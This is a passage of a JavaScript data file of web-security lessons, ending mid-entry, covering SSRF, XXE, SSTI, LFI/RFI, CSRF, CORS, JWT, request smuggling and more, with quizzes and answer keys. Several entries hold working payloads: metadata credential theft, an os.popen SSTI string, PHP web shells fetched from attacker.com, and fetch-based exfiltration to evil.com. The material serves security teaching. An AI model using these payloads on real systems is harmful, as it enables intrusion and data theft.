// Auto-generated field order: name, category, severity, definition, theory, cve, exploit, example, mitigation, quizzes.
// Categories follow OWASP-style groupings; severity is a qualitative CVSS-informed rating.
// `example` = { scenario: one-line real-world story, code: concrete vulnerable snippet / request-response }.
// `quizzes` = array of { question, options, answer } (3-4 per lesson, depth-dependent).
module.exports = [
  {
    "name": "Server-Side Request Forgery (SSRF)",
    "category": "Server-Side",
    "severity": "Critical",
    "definition": "SSRF allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.",
    "theory": "The server fetches a remote resource based on user-supplied input (a URL) without validating it. Attackers abuse this to reach internal services (169.254.169.254 cloud metadata, localhost admin panels, internal APIs) not exposed externally. Bypasses: decimal IP, IPv6, DNS rebinding, redirect chains.",
    "cve": "CVE-2021-26855 (Microsoft Exchange ProxyLogon)",
    "exploit": "1. Find a param that fetches a URL (?url=...).\n2. Replace with http://169.254.169.254/latest/meta-data/ (AWS).\n3. Enumerate IAM creds: /latest/meta-data/iam/security-credentials/.\n4. Use stolen keys against the cloud account.",
    "example": {
      "scenario": "An online invoice generator that 'fetches a logo from a URL' is used to pivot into the company's private AWS network and steal cloud credentials.",
      "code": "// Vulnerable endpoint\napp.get('/fetch-logo', async (req, res) => {\n  const resp = await axios.get(req.query.url); // no validation!\n  res.send(resp.data);\n});\n\n// Attacker request\nGET /fetch-logo?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"
    },
    "mitigation": "Whitelist domains, block private IP ranges, disable unused URL schemes, enforce IMDSv2.",
    "quizzes": [
      {
        "question": "Which internal IP is most commonly targeted in AWS SSRF attacks?",
        "options": [
          "127.0.0.1",
          "169.254.169.254",
          "10.0.0.1",
          "192.168.1.1"
        ],
        "answer": 1
      },
      {
        "question": "What is the root cause that makes SSRF possible?",
        "options": [
          "The server makes a request to a user-supplied URL without validating it",
          "The client browser caches images",
          "The database uses weak passwords",
          "TLS certificates are self-signed"
        ],
        "answer": 0
      },
      {
        "question": "Which technique can bypass a naive SSRF blocklist that only checks for 'localhost'?",
        "options": [
          "Using decimal/octal IP encoding or DNS rebinding",
          "Sending the request over UDP",
          "Using a longer password",
          "Encrypting the request body"
        ],
        "answer": 0
      },
      {
        "question": "What does enforcing IMDSv2 on AWS specifically defend against?",
        "options": [
          "SQL injection",
          "SSRF reaching the EC2 metadata endpoint without a session token",
          "Cross-site scripting",
          "Brute-force login attempts"
        ],
        "answer": 1
      }
    ]
  },
  {
    "name": "XML External Entity (XXE) Injection",
    "category": "Injection",
    "severity": "High",
    "definition": "XXE allows an attacker to interfere with an application's processing of XML data, often disclosing files or causing SSRF.",
    "theory": "XML parsers allowing DOCTYPE/external entities can be tricked into reading local files or making network requests. Caused by insecurely configured parsers (DTD enabled).",
    "cve": "CVE-2018-1000840",
    "exploit": "1. Submit XML with malicious DTD:\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>\n2. Server reflects /etc/passwd.\n3. Use php://filter or OOB for blind XXE.",
    "example": {
      "scenario": "A resume-upload feature that parses an applicant's XML-based portfolio file is used to read the server's /etc/passwd and internal config files.",
      "code": "<!-- Malicious resume.xml uploaded by attacker -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<resume><name>&xxe;</name></resume>\n\n// Server response (reflected name field)\n{\"name\": \"root:x:0:0:root:/root:/bin/bash\\n...\"}"
    },
    "mitigation": "Disable DTDs and external entities; prefer JSON.",
    "quizzes": [
      {
        "question": "What must be enabled in an XML parser for XXE to work?",
        "options": [
          "JSON parsing",
          "DTD / external entity processing",
          "HTTPS",
          "Cookies"
        ],
        "answer": 1
      },
      {
        "question": "Besides reading local files, what other major attack can XXE be used to launch?",
        "options": [
          "SSRF, via SYSTEM identifiers pointing to internal URLs",
          "SQL injection",
          "Buffer overflow",
          "Clickjacking"
        ],
        "answer": 0
      },
      {
        "question": "What is the most effective fix for XXE?",
        "options": [
          "Encrypt the XML payload",
          "Disable DTDs / external entity resolution in the parser",
          "Add a CAPTCHA to the upload form",
          "Increase the upload file size limit"
        ],
        "answer": 1
      }
    ]
  },
  {
    "name": "Insecure Deserialization",
    "category": "Server-Side",
    "severity": "Critical",
    "definition": "Untrusted data is used to abuse app logic by deserializing malicious objects, often leading to RCE.",
    "theory": "Apps deserializing attacker-controlled objects (Java, PHP, Python pickle, .NET) can be forced to run gadget chains during reconstruction, causing RCE.",
    "cve": "CVE-2017-9805 (Apache Struts REST)",
    "exploit": "1. Identify serialized data (Java rO0AB..., PHP O:4:...).\n2. Use ysoserial to craft a gadget chain.\n3. Send payload; chain triggers command execution.",
    "example": {
      "scenario": "A Java web app stores user session state as a base64-serialized object in a cookie; an attacker swaps it for a ysoserial gadget chain and gets a reverse shell.",
      "code": "// Vulnerable cookie handling\nObject session = new ObjectInputStream(\n  new ByteArrayInputStream(Base64.decode(cookie))\n).readObject(); // deserializes attacker-controlled bytes directly\n\n// Attacker-crafted cookie (generated via ysoserial)\nCookie: session=rO0ABXNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMu...="
    },
    "mitigation": "Never deserialize untrusted data; HMAC integrity; allowlist classes.",
    "quizzes": [
      {
        "question": "Which tool generates Java deserialization gadget chains?",
        "options": [
          "sqlmap",
          "ysoserial",
          "Burp",
          "nmap"
        ],
        "answer": 1
      },
      {
        "question": "Why is insecure deserialization so dangerous compared to typical input validation bugs?",
        "options": [
          "It only affects cookies",
          "Reconstructing the object can trigger code execution via gadget chains, not just bad data",
          "It always requires physical access",
          "It only works over HTTP, never HTTPS"
        ],
        "answer": 1
      },
      {
        "question": "What's a strong mitigation against deserialization attacks?",
        "options": [
          "Never deserialize untrusted input; use allowlists for permitted classes",
          "Increase session timeout",
          "Minify the JavaScript",
          "Use a CDN"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Server-Side Template Injection (SSTI)",
    "category": "Injection",
    "severity": "Critical",
    "definition": "User input embedded into a template engine unsafely, allowing template execution and often RCE.",
    "theory": "Template engines (Jinja2, Twig, Freemarker) evaluate expressions. If input reaches the template directly, attackers run server-side code.",
    "cve": "CVE-2019-8341 (Jinja2)",
    "exploit": "1. Inject {{7*7}} -> returns 49 confirms SSTI.\n2. Jinja2: {{ ''.__class__.__mro__[1].__subclasses__() }}.\n3. Find os/subprocess gadget to run commands.",
    "example": {
      "scenario": "A 'Contact Us' page that renders the user's name back in a confirmation message ('Hi {{name}}') using Jinja2 lets an attacker run shell commands on the server.",
      "code": "# Vulnerable Flask code\n@app.route('/greet')\ndef greet():\n    name = request.args.get('name')\n    return render_template_string(f'Hi {name}!')  # user input goes straight into the template\n\n# Attacker request\nGET /greet?name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
    },
    "mitigation": "Never concatenate input into templates; sandbox; logic-less templates.",
    "quizzes": [
      {
        "question": "Which payload is a classic SSTI detection probe?",
        "options": [
          "{{7*7}}",
          "' OR 1=1--",
          "<script>alert(1)</script>",
          "../../etc/passwd"
        ],
        "answer": 0
      },
      {
        "question": "Why does SSTI often lead to full remote code execution, unlike simple template bugs?",
        "options": [
          "Template engines like Jinja2 expose Python object internals reachable from rendered expressions",
          "Templates always run as root",
          "Browsers execute templates client-side",
          "SSTI only affects CSS"
        ],
        "answer": 0
      },
      {
        "question": "What is the safest fix for SSTI?",
        "options": [
          "Never pass user input directly into the template string itself; pass it only as template variables/context",
          "Switch to a faster template engine",
          "Cache rendered templates",
          "Use a longer session token"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Cross-Site Request Forgery (CSRF)",
    "category": "Auth & Session",
    "severity": "Medium",
    "definition": "Tricks an authenticated user's browser into submitting a malicious request to a site where they're logged in.",
    "theory": "Browsers auto-send cookies, so a malicious page can forge state-changing requests if no anti-CSRF token is required.",
    "cve": "CVE-2018-9942",
    "exploit": "1. Craft auto-submitting HTML form to victim endpoint.\n2. Lure victim while logged in.\n3. Browser sends authenticated request -> action executes.",
    "example": {
      "scenario": "A logged-in bank customer visits an unrelated forum; a hidden auto-submitting form on that page silently transfers money out of their account using their existing session cookie.",
      "code": "<!-- Malicious page hosted on attacker.com -->\n<form action=\"https://bank.com/transfer\" method=\"POST\" id=\"f\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker-account\">\n  <input type=\"hidden\" name=\"amount\" value=\"5000\">\n</form>\n<script>document.getElementById('f').submit();</script>"
    },
    "mitigation": "Anti-CSRF tokens, SameSite=Strict cookies, verify Origin/Referer.",
    "quizzes": [
      {
        "question": "Which cookie attribute best mitigates CSRF?",
        "options": [
          "HttpOnly",
          "Secure",
          "SameSite=Strict",
          "Domain"
        ],
        "answer": 2
      },
      {
        "question": "Why does CSRF work even though the attacker never sees the victim's cookies?",
        "options": [
          "Browsers automatically attach cookies to requests to the cookie's origin, regardless of which page triggered the request",
          "The attacker steals the cookie via JavaScript",
          "CSRF requires the victim to type their password on the malicious page",
          "Cookies are sent in the URL"
        ],
        "answer": 0
      },
      {
        "question": "What does a properly implemented anti-CSRF token prevent?",
        "options": [
          "An attacker site from forging a valid request, since it cannot read or guess the token",
          "SQL injection",
          "Brute force login",
          "DNS spoofing"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Path / Directory Traversal",
    "category": "Access Control",
    "severity": "High",
    "definition": "Read arbitrary files outside the intended directory using ../ sequences.",
    "theory": "Apps building file paths from input without sanitization let attackers escape the web root to sensitive files.",
    "cve": "CVE-2021-41773 (Apache HTTP Server)",
    "exploit": "1. Find ?file=report.pdf.\n2. Try ?file=../../../../etc/passwd.\n3. Encoding bypass: %2e%2e%2f or ....//",
    "example": {
      "scenario": "A document portal that lets users download reports via a filename parameter is used to walk out of the reports folder and read the server's password file.",
      "code": "// Vulnerable Express route\napp.get('/download', (req, res) => {\n  res.sendFile(`/var/www/reports/${req.query.file}`); // no sanitization\n});\n\n// Attacker request\nGET /download?file=../../../../etc/passwd"
    },
    "mitigation": "Canonicalize paths, allowlists, avoid passing input to FS APIs.",
    "quizzes": [
      {
        "question": "What sequence is the hallmark of path traversal?",
        "options": [
          "&&",
          "../",
          "<>",
          "%00 only"
        ],
        "answer": 1
      },
      {
        "question": "Which technique can bypass a filter that simply strips the literal string '../'?",
        "options": [
          "URL-encoding the sequence (%2e%2e%2f) or using nested traversal like '....//'",
          "Sending the request twice",
          "Using uppercase letters in the filename",
          "Adding extra spaces"
        ],
        "answer": 0
      },
      {
        "question": "What is the most robust defense against path traversal?",
        "options": [
          "Canonicalize the resolved path and verify it's still inside the allowed base directory, plus use an allowlist of filenames",
          "Block requests containing the word 'etc'",
          "Rate-limit the endpoint",
          "Use HTTPS only"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Local File Inclusion (LFI)",
    "category": "Access Control",
    "severity": "High",
    "definition": "Include local files on the server through dynamic inclusion mechanisms.",
    "theory": "Scripts that include files based on input (PHP include) can read logs/configs or escalate to RCE via log poisoning / PHP wrappers.",
    "cve": "CVE-2018-16763 (FUEL CMS)",
    "exploit": "1. ?page=about -> ?page=../../../../etc/passwd.\n2. php://filter/convert.base64-encode/resource=index.php.\n3. Log poisoning + LFI -> RCE.",
    "example": {
      "scenario": "A PHP site that loads page content via a 'page' query parameter is abused to include the Apache access log after an attacker poisons it with PHP code in their User-Agent header, achieving remote code execution.",
      "code": "// Vulnerable PHP\n<?php include($_GET['page'] . '.php'); ?>\n\n// Step 1: poison access log via User-Agent header\nUser-Agent: <?php system($_GET['cmd']); ?>\n\n// Step 2: include the log file to execute the injected PHP\nGET /index.php?page=../../../../var/log/apache2/access&cmd=id"
    },
    "mitigation": "Allowlist includable files; disable allow_url_include.",
    "quizzes": [
      {
        "question": "LFI can escalate to RCE through which technique?",
        "options": [
          "Log poisoning",
          "DNS spoofing",
          "ARP poisoning",
          "Phishing"
        ],
        "answer": 0
      },
      {
        "question": "What PHP wrapper is commonly used in LFI to read source code as base64 instead of executing it?",
        "options": [
          "php://filter/convert.base64-encode/resource=",
          "http://",
          "ftp://",
          "data://text/plain"
        ],
        "answer": 0
      },
      {
        "question": "Which configuration setting, if disabled, helps prevent LFI from escalating via remote wrappers?",
        "options": [
          "allow_url_include",
          "display_errors",
          "memory_limit",
          "max_execution_time"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Remote File Inclusion (RFI)",
    "category": "Access Control",
    "severity": "Critical",
    "definition": "Include a remote attacker-hosted file into execution, often leading to RCE.",
    "theory": "With allow_url_include enabled and unsanitized input, the server fetches and executes a remote malicious script.",
    "cve": "CVE-2017-9841 (PHPUnit eval-stdin)",
    "exploit": "1. ?page=http://attacker.com/shell.txt.\n2. Server fetches & executes remote PHP shell.\n3. Gain command execution.",
    "example": {
      "scenario": "A legacy PHP CMS that includes a 'page' module by name is tricked into fetching and executing a PHP web shell hosted on an attacker's own server.",
      "code": "// Vulnerable PHP with allow_url_include=On\n<?php include($_GET['page']); ?>\n\n// Attacker-hosted shell.txt\n<?php system($_GET['cmd']); ?>\n\n// Attacker request\nGET /index.php?page=http://attacker.com/shell.txt&cmd=whoami"
    },
    "mitigation": "Disable allow_url_include and allow_url_fopen.",
    "quizzes": [
      {
        "question": "RFI includes files from where (vs LFI)?",
        "options": [
          "The local disk",
          "A remote attacker-controlled server",
          "The database",
          "Memory"
        ],
        "answer": 1
      },
      {
        "question": "Which PHP setting must typically be enabled for classic RFI to work?",
        "options": [
          "allow_url_include",
          "short_open_tag",
          "error_reporting",
          "session.gc_maxlifetime"
        ],
        "answer": 0
      },
      {
        "question": "Why is RFI generally considered more severe than LFI?",
        "options": [
          "The attacker fully controls the included code's content, not just which local file is read",
          "RFI never gets logged",
          "RFI requires no network access",
          "RFI only affects static files"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Open Redirect",
    "category": "Auth & Session",
    "severity": "Medium",
    "definition": "Craft a link that redirects victims to a malicious site via a trusted domain.",
    "theory": "Unvalidated redirect params enable phishing, OAuth token theft, SSRF chaining. The trusted domain builds victim confidence.",
    "cve": "CVE-2019-11510 context",
    "exploit": "1. Find ?redirect=/dashboard.\n2. Change to ?redirect=https://evil.com.\n3. Use in phishing to steal creds/OAuth codes.",
    "example": {
      "scenario": "A phishing email links to the real bank's login page with a redirect parameter pointing to a lookalike fake login page, so the link looks completely trustworthy at a glance.",
      "code": "// Vulnerable redirect handler\napp.get('/login', (req, res) => {\n  // ...after successful login...\n  res.redirect(req.query.redirect); // unvalidated\n});\n\n// Phishing link sent to victim (looks like the real bank domain)\nhttps://realbank.com/login?redirect=https://evil-realbank-lookalike.com"
    },
    "mitigation": "Relative paths only, allowlist targets, interstitial warnings.",
    "quizzes": [
      {
        "question": "Open redirects are most commonly abused for?",
        "options": [
          "Phishing / token theft",
          "Buffer overflow",
          "Race condition",
          "DoS"
        ],
        "answer": 0
      },
      {
        "question": "Why are open redirects considered more dangerous in OAuth flows specifically?",
        "options": [
          "They can be chained to leak authorization codes/tokens to an attacker-controlled redirect_uri",
          "They slow down page load",
          "They bypass TLS entirely",
          "They corrupt the database"
        ],
        "answer": 0
      },
      {
        "question": "What's the safest fix for open redirects?",
        "options": [
          "Only allow relative paths or validate the target against an explicit allowlist of domains",
          "Add a CAPTCHA before redirecting",
          "Use a longer URL",
          "Log the redirect destination"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Race Condition (TOCTOU)",
    "category": "Business Logic",
    "severity": "High",
    "definition": "Timing of operations is manipulated to cause unintended behavior, e.g. double-spending.",
    "theory": "Time-of-check to time-of-use gaps let concurrent requests bypass limits (redeem coupon twice, withdraw twice).",
    "cve": "CVE-2016-5195 (Dirty COW)",
    "exploit": "1. Identify a limited action.\n2. Send many simultaneous requests (Turbo Intruder / single-packet).\n3. Multiple succeed before the check updates.",
    "example": {
      "scenario": "A gift-card redemption endpoint checks the card's balance and then deducts it in two separate steps; firing 20 redemption requests at the exact same instant drains far more value than the card actually had.",
      "code": "// Vulnerable logic (check-then-use, not atomic)\nconst card = await db.query('SELECT balance FROM cards WHERE id=$1', [id]);\nif (card.balance >= amount) {\n  await db.query('UPDATE cards SET balance = balance - $1 WHERE id=$2', [amount, id]);\n  // 20 parallel requests can all pass the check before any UPDATE commits\n}"
    },
    "mitigation": "Atomic operations, DB locks, idempotency keys, transactions.",
    "quizzes": [
      {
        "question": "Race conditions exploit the gap between which two events?",
        "options": [
          "Login and logout",
          "Check and use (TOCTOU)",
          "Request and response",
          "DNS and TCP"
        ],
        "answer": 1
      },
      {
        "question": "What tool/technique is commonly used to fire many requests at nearly the same instant to exploit a race condition?",
        "options": [
          "Turbo Intruder / single-packet attack",
          "sqlmap",
          "nikto",
          "John the Ripper"
        ],
        "answer": 0
      },
      {
        "question": "What's the most reliable fix for TOCTOU race conditions in a database-backed action?",
        "options": [
          "Perform the check-and-update as a single atomic database operation/transaction with proper locking",
          "Add a CAPTCHA",
          "Increase the session timeout",
          "Use HTTPS"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Business Logic Vulnerability",
    "category": "Business Logic",
    "severity": "Medium",
    "definition": "Flaws in business rule design/implementation allowing unintended behavior.",
    "theory": "Logic flaws: negative quantities, price manipulation, skipping payment, abusing workflows. Scanners can't find them.",
    "cve": "CVE-2020-11651 context",
    "exploit": "1. Add item, intercept, set quantity=-1.\n2. Total becomes negative -> account credited.\n3. Or skip payment and jump to 'order confirmed'.",
    "example": {
      "scenario": "An e-commerce checkout lets a shopper set a cart item's quantity to -1 in the intercepted request, flipping the total negative and crediting money back to their own account instead of charging them.",
      "code": "// Vulnerable cart logic — no validation on quantity sign\ncart.total = items.reduce((sum, i) => sum + i.price * i.quantity, 0);\n// attacker-modified request body\n{ \"items\": [ { \"sku\": \"LAPTOP-1\", \"price\": 999, \"quantity\": -1 } ] }\n// total becomes -999 -> applied as a credit to the account"
    },
    "mitigation": "Validate business rules server-side; enforce state machines.",
    "quizzes": [
      {
        "question": "Why are business logic flaws hard for scanners?",
        "options": [
          "They require understanding intended behavior",
          "They use encryption",
          "They are network-only",
          "They need root"
        ],
        "answer": 0
      },
      {
        "question": "Which of these is a classic business logic flaw?",
        "options": [
          "Setting a cart quantity to a negative number to flip the total into a credit",
          "SQL injection in a login form",
          "An expired TLS certificate",
          "A missing security header"
        ],
        "answer": 0
      },
      {
        "question": "What is the core defense against business logic vulnerabilities?",
        "options": [
          "Enforce all business rules and valid state transitions server-side, never trust client-supplied values like price or quantity",
          "Use a faster framework",
          "Add more unit tests for UI rendering",
          "Minify JavaScript"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Subdomain Takeover",
    "category": "Infrastructure",
    "severity": "High",
    "definition": "A subdomain points to a deprovisioned external service an attacker can re-register.",
    "theory": "A dangling DNS CNAME points to an unclaimed service (S3, GitHub Pages, Heroku). Attacker claims it and serves content on the victim's subdomain.",
    "cve": "Multiple disclosed (HackerOne)",
    "exploit": "1. Enumerate subdomains (subfinder, amass).\n2. Find CNAMEs to unclaimed services (404 fingerprint).\n3. Register that service and host content.",
    "example": {
      "scenario": "A company decommissions a marketing campaign hosted on GitHub Pages but forgets to remove the DNS CNAME; an attacker registers the same GitHub Pages project name and now fully controls content served from promo.company.com.",
      "code": "// Dangling DNS record\npromo.company.com.  CNAME  old-campaign.github.io.\n\n// Attacker steps\n$ dig promo.company.com CNAME\n; old-campaign.github.io (returns 404 'There isn't a GitHub Pages site here')\n# Attacker creates a GitHub repo/Pages site named 'old-campaign' -> now serves their content on promo.company.com"
    },
    "mitigation": "Remove dangling DNS records; audit DNS regularly.",
    "quizzes": [
      {
        "question": "Subdomain takeover exploits a dangling what?",
        "options": [
          "TCP port",
          "DNS CNAME record",
          "Cookie",
          "JWT"
        ],
        "answer": 1
      },
      {
        "question": "What's a common fingerprint that signals a subdomain is vulnerable to takeover?",
        "options": [
          "A distinctive 'not found' / unclaimed page returned by the third-party service (e.g. GitHub Pages 404)",
          "A 200 OK with valid content",
          "A redirect to the company homepage",
          "A 500 server error"
        ],
        "answer": 0
      },
      {
        "question": "What is the best practice to prevent subdomain takeover?",
        "options": [
          "Remove the DNS record immediately when decommissioning a third-party-hosted service",
          "Add a robots.txt file",
          "Lower the DNS TTL",
          "Use HTTPS only"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "JWT Vulnerabilities",
    "category": "Auth & Session",
    "severity": "Critical",
    "definition": "Flaws in JWT implementation: 'none' algorithm, weak secrets, key confusion.",
    "theory": "JWTs are signed tokens. Misconfigs: accepting alg:none, brute-forcing HS256 secrets, RS256->HS256 key confusion.",
    "cve": "CVE-2015-9235 (jsonwebtoken)",
    "exploit": "1. Decode the JWT (base64).\n2. Set alg to 'none' and strip signature.\n3. Or crack HS256 secret with hashcat and re-sign as admin.",
    "example": {
      "scenario": "An API that accepts the JWT 'alg' header at face value lets an attacker simply change it to 'none', strip the signature, and forge a token claiming to be an admin user.",
      "code": "// Original token payload (decoded)\n{\"alg\":\"HS256\",\"typ\":\"JWT\"}.{\"sub\":\"user123\",\"role\":\"user\"}.SIGNATURE\n\n// Attacker-forged token\n{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"user123\",\"role\":\"admin\"}.\n// Vulnerable server code\nconst decoded = jwt.verify(token, secret, { algorithms: ['HS256','none'] }); // accepting 'none' is the bug"
    },
    "mitigation": "Pin the algorithm, strong secrets/keys, strict validation.",
    "quizzes": [
      {
        "question": "Which JWT algorithm setting is dangerous if accepted?",
        "options": [
          "RS256",
          "none",
          "ES256",
          "HS512"
        ],
        "answer": 1
      },
      {
        "question": "What is 'key confusion' in the context of JWT attacks?",
        "options": [
          "Tricking a server expecting RS256 (public/private key) into verifying a token with HS256 using the public key as the HMAC secret",
          "Forgetting your password",
          "Using two different cookies",
          "Mixing up session IDs between users"
        ],
        "answer": 0
      },
      {
        "question": "What's the strongest defense against JWT algorithm-confusion attacks?",
        "options": [
          "Explicitly pin/whitelist the expected algorithm on the server and never trust the alg header from the token itself",
          "Make the JWT longer",
          "Store JWTs in localStorage",
          "Use a shorter expiry only"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Clickjacking (UI Redressing)",
    "category": "Client-Side",
    "severity": "Medium",
    "definition": "Trick a user into clicking something different from what they perceive via invisible iframes.",
    "theory": "Attacker overlays a transparent iframe of a target over decoy content, so victim clicks trigger framed-site actions.",
    "cve": "Various framing issues",
    "exploit": "1. Iframe the target with opacity:0 over a fake button.\n2. Position the real button under the cursor.\n3. Victim clicks -> hidden action executes.",
    "example": {
      "scenario": "A 'Claim your free prize!' page secretly overlays a transparent iframe of a social media site's 'Follow' button exactly under the visible 'Claim' button, so clicking it actually follows an attacker-controlled account.",
      "code": "<!-- Attacker page -->\n<style>\n  iframe { position:absolute; top:0; left:0; opacity:0.0; width:300px; height:50px; }\n  .decoy-button { position:absolute; top:0; left:0; }\n</style>\n<iframe src=\"https://social.example/follow?user=attacker\"></iframe>\n<button class=\"decoy-button\">Claim your free prize!</button>"
    },
    "mitigation": "X-Frame-Options: DENY and CSP frame-ancestors 'none'.",
    "quizzes": [
      {
        "question": "Which header prevents clickjacking?",
        "options": [
          "X-Frame-Options",
          "Content-Type",
          "Cache-Control",
          "ETag"
        ],
        "answer": 0
      },
      {
        "question": "What makes clickjacking deceptive to the victim?",
        "options": [
          "A transparent/invisible iframe of the real target site is positioned exactly under visible decoy content",
          "The attacker steals the victim's password",
          "The victim's browser is out of date",
          "The page uses an expired certificate"
        ],
        "answer": 0
      },
      {
        "question": "Besides X-Frame-Options, which modern CSP directive also defends against clickjacking?",
        "options": [
          "frame-ancestors",
          "script-src",
          "default-src",
          "img-src"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "CORS Misconfiguration",
    "category": "Auth & Session",
    "severity": "High",
    "definition": "Improper CORS config lets malicious sites read sensitive responses.",
    "theory": "Reflecting Origin into Access-Control-Allow-Origin with credentials lets any attacker site read authenticated responses.",
    "cve": "Many web app cases",
    "exploit": "1. Send request with Origin: https://evil.com.\n2. If reflected + Allow-Credentials:true, read victim data via JS.\n3. Exfiltrate to attacker server.",
    "example": {
      "scenario": "A dashboard API reflects whatever Origin header it receives back into Access-Control-Allow-Origin and also sets Allow-Credentials: true, letting an attacker's website read a logged-in victim's private account data via a background JS fetch.",
      "code": "// Vulnerable server response headers\nAccess-Control-Allow-Origin: https://evil.com   // reflected attacker origin\nAccess-Control-Allow-Credentials: true\n\n// Attacker page JS\nfetch('https://victim-app.com/api/account', { credentials: 'include' })\n  .then(r => r.json())\n  .then(data => fetch('https://evil.com/steal', { method:'POST', body: JSON.stringify(data) }));"
    },
    "mitigation": "Strict origin allowlist; never reflect arbitrary origins with creds.",
    "quizzes": [
      {
        "question": "Dangerous CORS combo reflects Origin together with what?",
        "options": [
          "Allow-Credentials: true",
          "HttpOnly",
          "Cache-Control",
          "Gzip"
        ],
        "answer": 0
      },
      {
        "question": "What does a misconfigured CORS policy actually allow an attacker's JavaScript to do?",
        "options": [
          "Read the victim's authenticated response data cross-origin via the browser",
          "Modify the victim's DNS settings",
          "Install malware on the victim's machine",
          "Bypass TLS certificate validation"
        ],
        "answer": 0
      },
      {
        "question": "What is the correct fix for CORS misconfiguration?",
        "options": [
          "Maintain a strict, explicit allowlist of trusted origins instead of reflecting any Origin header",
          "Disable CORS entirely on all endpoints",
          "Always set Allow-Origin: *",
          "Add a CAPTCHA"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "HTTP Request Smuggling",
    "category": "Infrastructure",
    "severity": "Critical",
    "definition": "Exploits front-end/back-end disagreement in parsing request boundaries.",
    "theory": "When proxy and back-end disagree on Content-Length vs Transfer-Encoding, attacker smuggles a hidden request, poisoning others' responses.",
    "cve": "CVE-2019-18277 (HAProxy)",
    "exploit": "1. Send crafted request with both CL and TE (CL.TE / TE.CL).\n2. Back-end mis-parses, leaving a prefix.\n3. Next user's request gets prepended -> hijack.",
    "example": {
      "scenario": "A front-end proxy and back-end server disagree on where one request ends, letting an attacker smuggle a hidden second request that gets prepended to the next legitimate visitor's request, hijacking their session.",
      "code": "POST /checkout HTTP/1.1\nHost: victim.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-Ignore: x\n\n// Front-end trusts Content-Length (sees a short, complete request)\n// Back-end trusts Transfer-Encoding (sees the chunked body end early at '0')\n// -> the smuggled 'GET /admin' line gets queued and prepended to the next user's request"
    },
    "mitigation": "Normalize requests, reject ambiguous CL/TE, HTTP/2 end-to-end.",
    "quizzes": [
      {
        "question": "Request smuggling abuses disagreement between which headers?",
        "options": [
          "Host & Referer",
          "Content-Length & Transfer-Encoding",
          "Cookie & Origin",
          "Accept & ETag"
        ],
        "answer": 1
      },
      {
        "question": "In a 'CL.TE' smuggling attack, which component trusts the Content-Length header?",
        "options": [
          "The front-end proxy",
          "The back-end server",
          "Both equally",
          "Neither"
        ],
        "answer": 0
      },
      {
        "question": "What is an effective infrastructure-level fix for HTTP request smuggling?",
        "options": [
          "Reject requests with ambiguous/conflicting Content-Length and Transfer-Encoding headers, or use HTTP/2 end-to-end",
          "Increase the Content-Length limit",
          "Disable chunked encoding only on the client",
          "Add more front-end servers"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Mass Assignment",
    "category": "Access Control",
    "severity": "High",
    "definition": "Framework auto-binds request params to object fields, setting unintended fields.",
    "theory": "ORMs auto-mapping JSON to model attributes let attackers add isAdmin:true or balance:9999 to requests.",
    "cve": "CVE-2012-2660 (Ruby on Rails)",
    "exploit": "1. Register/update with extra JSON: {\"username\":\"x\",\"role\":\"admin\"}.\n2. Framework binds role -> privilege escalation.",
    "example": {
      "scenario": "A user-profile update endpoint binds the entire JSON body directly onto the User model, so adding an extra 'role' field to the request silently promotes the attacker's own account to admin.",
      "code": "// Vulnerable controller (auto-binds all fields)\napp.put('/profile', (req, res) => {\n  Object.assign(currentUser, req.body); // no field allowlist\n  currentUser.save();\n});\n\n// Attacker request body\n{ \"displayName\": \"Het\", \"role\": \"admin\", \"isVerified\": true }"
    },
    "mitigation": "Allowlists (strong params), DTOs, explicit binding.",
    "quizzes": [
      {
        "question": "Mass assignment lets attackers set which fields?",
        "options": [
          "Only public fields",
          "Unintended sensitive fields like isAdmin",
          "CSS styles",
          "DNS records"
        ],
        "answer": 1
      },
      {
        "question": "What underlying framework behavior causes mass assignment vulnerabilities?",
        "options": [
          "Automatically binding all incoming JSON/form fields onto a model object without restriction",
          "Weak password hashing",
          "Missing HTTPS",
          "Slow database queries"
        ],
        "answer": 0
      },
      {
        "question": "What's the standard fix for mass assignment?",
        "options": [
          "Use explicit allowlists / DTOs that only bind expected, safe fields",
          "Block all PUT requests",
          "Encrypt the request body",
          "Add rate limiting"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Prototype Pollution (JavaScript)",
    "category": "Client-Side",
    "severity": "High",
    "definition": "Attacker modifies Object.prototype, affecting all objects; can lead to RCE/DoS.",
    "theory": "Insecure recursive merge/clone lets keys like __proto__ inject properties into the base prototype, polluting every object.",
    "cve": "CVE-2019-10744 (lodash)",
    "exploit": "1. Send JSON: {\"__proto__\":{\"isAdmin\":true}}.\n2. Vulnerable merge pollutes Object.prototype.\n3. App treats all users as admin or crashes.",
    "example": {
      "scenario": "A settings-merge endpoint that recursively merges user-supplied JSON into a config object is tricked into injecting an 'isAdmin' property onto the global Object.prototype, making every object in the app — including other users' sessions — appear to be an admin.",
